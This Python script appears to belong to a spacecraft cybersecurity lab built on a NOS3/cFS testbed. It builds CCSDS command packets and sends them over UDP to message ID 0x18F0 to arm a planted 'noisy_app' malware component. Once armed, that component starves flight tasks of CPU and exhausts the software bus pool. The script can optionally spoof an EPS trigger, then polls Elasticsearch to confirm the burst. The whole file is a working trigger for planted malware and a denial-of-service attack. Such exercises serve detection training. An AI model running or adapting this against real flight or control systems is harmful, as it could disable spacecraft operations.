#!/usr/bin/env python3
"""
attack_noisy_trigger.py - Scenario 1 Phase B: Arm noisy_app via BEACON_PING_FC

Sends 3 BEACON_PING_FC (FC=2) commands to MID 0x18F0 (MALWARE_TRIGGER_MID)
to arm noisy_app. After the third ping the app exits its dormant polling loop
and executes:
  1. CPU burn: 5,000,000 volatile iterations at Priority 20 (starves cFS tasks)
  2. SB flood: 4 copies × 8,192 MIDs × 4,104 bytes = 32,768 TransmitMsg calls
              → SB pool (512 KB) exhausted after ~128 messages (~0.5 ms)

After arming, use Kibana to confirm the burst:
    GET nos3-telemetry-*/_search
    { "query": { "match": { "msg_name": "NOISY_APP" } } }

Usage:
    python3 attack_noisy_trigger.py [OPTIONS]

Options:
    --host        Target host (default: 127.0.0.1)
    --port        CI UDP port (default: 5010)
    --kibana-url  Kibana/ES URL for burst confirmation (default: http://localhost:9200)
    --no-confirm  Skip Kibana confirmation poll
    --spoof-eps   Send one FC=3 spoof trigger before the final arming ping

References:
    MALWARE_TRIGGER_MID = 0x18F0  (noisy_app.c)
    BEACON_PING_FC      = 2       (noisy_app.c)
    SPOOF_EPS_FC        = 3       (noisy_app.c)
    TRIGGER_THRESHOLD   = 3       (noisy_app.c)
"""

import argparse
import json
import os
import socket
import struct
import time
import urllib.error
import urllib.request

DEFAULT_ES_URL = os.environ.get(
    "ES_URL", f"http://localhost:{os.environ.get('ES_PORT', '9200')}"
)

MALWARE_TRIGGER_MID = 0x18F0
BEACON_PING_FC      = 2
SPOOF_EPS_FC        = 3
TRIGGER_THRESHOLD   = 3
CCSDS_TYPE_CMD      = 1
CCSDS_SEC_HDR       = 1
CCSDS_APID_MASK     = 0x07FF


def build_ccsds_cmd(apid: int, cc: int) -> bytes:
    """Build an 8-byte CCSDS no-arg command packet."""
    stream_id = (CCSDS_TYPE_CMD << 12) | (CCSDS_SEC_HDR << 11) | (apid & CCSDS_APID_MASK)
    sequence  = 0xC000
    data_len  = 1
    pri_hdr   = struct.pack(">HHH", stream_id, sequence, data_len)
    sec_hdr   = struct.pack("BB", cc & 0x7F, 0x00)
    return pri_hdr + sec_hdr


def poll_kibana_burst(es_url: str, timeout: float = 30.0) -> bool:
    """
    Poll Elasticsearch for a burst of NOISY_APP events after trigger.
    Returns True if burst detected (>10 events in last 60 seconds).
    """
    query = json.dumps({
        "query": {
            "bool": {
                "must": [
                    {"match": {"msg_name": "NOISY_APP"}},
                    {"range": {"@timestamp": {"gte": "now-60s"}}}
                ]
            }
        },
        "size": 0
    }).encode()

    deadline = time.time() + timeout
    print(f"[*] Polling {es_url}/nos3-telemetry-*/_count for NOISY_APP burst (timeout {timeout:.0f}s)...")
    while time.time() < deadline:
        try:
            req = urllib.request.Request(
                f"{es_url}/nos3-telemetry-*/_search",
                data=query,
                headers={"Content-Type": "application/json"}
            )
            with urllib.request.urlopen(req, timeout=5) as resp:
                data = json.loads(resp.read())
                count = data.get("hits", {}).get("total", {}).get("value", 0)
                if count > 10:
                    print(f"[+] Burst confirmed: {count} NOISY_APP events in last 60s")
                    return True
                print(f"    Waiting... ({count} events so far)", flush=True)
        except (urllib.error.URLError, Exception) as exc:
            print(f"    ES query failed: {exc}", flush=True)
        time.sleep(3)
    return False


def main() -> None:
    parser = argparse.ArgumentParser(description="Arm noisy_app via 3x BEACON_PING_FC (Scenario 1 Phase B)")
    parser.add_argument("--host",       default="127.0.0.1",         help="Target host (default: 127.0.0.1)")
    parser.add_argument("--port",       type=int, default=5010,       help="CI UDP port (default: 5010)")
    parser.add_argument("--kibana-url", default=DEFAULT_ES_URL,
                        help=f"Elasticsearch base URL (default: {DEFAULT_ES_URL}; "
                             f"override via ES_URL or ES_PORT env vars)")
    parser.add_argument("--no-confirm", action="store_true",          help="Skip Kibana burst confirmation")
    parser.add_argument("--spoof-eps",  action="store_true",
                        help="Send one EPS spoof trigger (FC=3) before final arming ping")
    args = parser.parse_args()

    packet = build_ccsds_cmd(MALWARE_TRIGGER_MID & CCSDS_APID_MASK, BEACON_PING_FC)
    sock   = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print(f"[*] Sending {TRIGGER_THRESHOLD} BEACON_PING_FC (FC={BEACON_PING_FC}) → {args.host}:{args.port}")
    print(f"[*] MID: 0x{MALWARE_TRIGGER_MID:04X}  (MALWARE_TRIGGER_MID)")

    for i in range(TRIGGER_THRESHOLD):
        # noisy_app polls trigger commands only while unarmed; send spoof before final arm ping
        if args.spoof_eps and i == (TRIGGER_THRESHOLD - 1):
            spoof_packet = build_ccsds_cmd(MALWARE_TRIGGER_MID & CCSDS_APID_MASK, SPOOF_EPS_FC)
            sock.sendto(spoof_packet, (args.host, args.port))
            print(f"    EPS spoof trigger sent (FC={SPOOF_EPS_FC})")
            time.sleep(0.1)

        sock.sendto(packet, (args.host, args.port))
        print(f"    Ping {i + 1}/{TRIGGER_THRESHOLD} sent")
        time.sleep(0.1)   # 100ms - matches noisy_app OS_TaskDelay(100) polling period

    sock.close()
    print("[+] Trigger sequence complete. noisy_app should be armed.")
    print("[!] Expect: CPU spike to 100%, SB pool exhausted, HK telemetry flatline.")

    if not args.no_confirm:
        burst_seen = poll_kibana_burst(args.kibana_url, timeout=30.0)
        if not burst_seen:
            print("[WARN] No NOISY_APP burst detected in Kibana within 30s.")
            print("       Check: `make debug` → `top` inside container for CPU at 100%.")


if __name__ == "__main__":
    main()
